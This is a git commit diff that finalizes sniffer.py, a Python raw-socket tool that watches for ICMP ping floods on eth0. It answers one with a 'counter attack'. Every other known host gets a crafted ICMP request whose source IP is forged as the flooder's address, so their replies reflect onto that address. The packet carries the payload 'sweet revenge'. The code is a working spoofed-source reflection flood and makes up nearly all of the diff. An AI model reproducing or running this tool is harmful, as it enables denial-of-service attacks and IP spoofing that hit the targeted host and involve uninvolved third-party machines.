ac3c4fe8e7c1e84cac1816085c013818b2e87aa3
Pedrochem <pedrochem@hotmail.com>
2021-05-13 20:59:58 -0300

    finalized code

--- sniffer.py
+++ sniffer.py
@@ -1,20 +1,27 @@
-
 import socket, sys
 import struct
 import queue
 import datetime
 
 ETH_P_ALL = 0x0003
-eth_length = 14
+
+# time in seconds
+TIME_LIMIT = 1
+SIZE_LIMIT = 100
+
+ICMP_PROTOCOL = 1
+
+ETH_LENGTH = 14
+IP_HOST = socket.gethostbyname(socket.gethostname())
+
 senders = {}
-ip_host = socket.gethostbyname(socket.gethostname())
 
 def bytes_to_mac(bytesmac):
     return ":".join("{:02x}".format(x) for x in bytesmac)
 
+# Handles IP requests and calls "receiveIcmp" an icmp request to the host was identified
 def receiveIp(packet):
-    # print("IP Packet")
-    ip_header = packet[eth_length:20+eth_length]
+    ip_header = packet[ETH_LENGTH:20+ETH_LENGTH]
     iph = struct.unpack("!BBHHHBBH4s4s", ip_header)
     version_ihl = iph[0]
     version = version_ihl >> 4
@@ -24,37 +31,37 @@ def receiveIp(packet):
     protocol = iph[6]
     s_addr = socket.inet_ntoa(iph[8])
     d_addr = socket.inet_ntoa(iph[9])
-    # print("IP Src: "+s_addr)
-    # print("IP Dst: "+d_addr)
-
-    # icmp protocol
-    if protocol == 1 and s_addr != ip_host:
+    
+    if protocol == ICMP_PROTOCOL and s_addr != IP_HOST and d_addr == IP_HOST:
         receiveIcmp(packet, iph_length,s_addr)
 
 
+# Handles ICMP requests and calls counter attack if ping flood was identified
 def receiveIcmp(packet, iph_length,s_addr):
-    print("ICMP Packet")
-    icmp_header = packet[iph_length + eth_length:]
+    print("Receiving ICMP from IP: ",s_addr)
+    icmp_header = packet[iph_length + ETH_LENGTH:]
     icmph = struct.unpack("!BBHHH%ds" % (len(icmp_header)-8), icmp_header)
     now = datetime.datetime.now()
 
     if s_addr not in senders:
-        senders[s_addr] = queue.Queue(100)
+        senders[s_addr] = queue.Queue(SIZE_LIMIT)
 
     elif senders[s_addr].full():
-        print("------------------Enchi---------------------------")
         timeFirst = senders[s_addr].get()
-        if timeFirst + datetime.timedelta(seconds=1) > now:
+        if timeFirst + datetime.timedelta(seconds=TIME_LIMIT) > now:
+            print("Counter-Atacking    IP: ",s_addr)
             counterAttack(s_addr)
 
     senders[s_addr].put(now)
 
 
+# Call all known addresses (except for the attacker's) to counter attack ping flood
 def counterAttack(s_addr):
     for addr in senders:
         if addr != s_addr:
             sendIcmp(addr,s_addr)
 
+# Sends ICMP requests
 def sendIcmp(addr,s_addr):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
@@ -68,32 +75,30 @@ def sendIcmp(addr,s_addr):
     mychecksum = 0
     identifier = 12345
     seqnumber = 0
-    payload = b"istoehumteste"
-
+    payload = b"sweet revenge"
     icmp_packet = struct.pack("!BBHHH%ds"%len(payload), type, code, mychecksum, identifier, seqnumber, payload)
     mychecksum = checksum(icmp_packet)
     icmp_packet = struct.pack("!BBHHH%ds"%len(payload), type, code, mychecksum, identifier, seqnumber, payload)
-    
     ip_ver = 4
     ip_ihl = 5
     ip_tos = 0
-    ip_tot_len = 0 # automaticamente preenchido - AF_INET
+    ip_tot_len = 0 
     ip_id = 54321
     ip_frag_off = 0
     ip_ttl = 255
     ip_proto = socket.IPPROTO_ICMP
-    ip_check = 0  # automaticamente preenchido - AF_INET
+    ip_check = 0 
+
+    # sets sender address as the attackers ip
     ip_saddr = socket.inet_aton(s_addr)
+
     ip_daddr = socket.inet_aton(addr)
-
     ip_ihl_ver = (ip_ver << 4) + ip_ihl
-
     ip_header = struct.pack("!BBHHHBBH4s4s", ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl,
         ip_proto, ip_check, ip_saddr, ip_daddr)
 
     dest_ip = addr
     dest_addr = socket.gethostbyname(dest_ip)
-
     s.sendto(ip_header+icmp_packet, (dest_addr,0))
 
 
@@ -118,22 +123,13 @@ def start():
         print('Error'+str(msg))
         sys.exit(1)
 
-    # print('Socket created!')
-
-
     s.bind(('eth0',0))
 
     while True:
         (packet,addr) = s.recvfrom(65536)
 
-        # eth_length = 14
         eth_header = packet[:14]
-
         eth = struct.unpack("!6s6sH",eth_header)
-
-        # print("MAC Dst: "+bytes_to_mac(eth[0]))
-        # print("MAC Src: "+bytes_to_mac(eth[1]))
-        # print("Type: "+hex(eth[2]))
 
         if eth[2] == 0x0800 :
             receiveIp(packet)
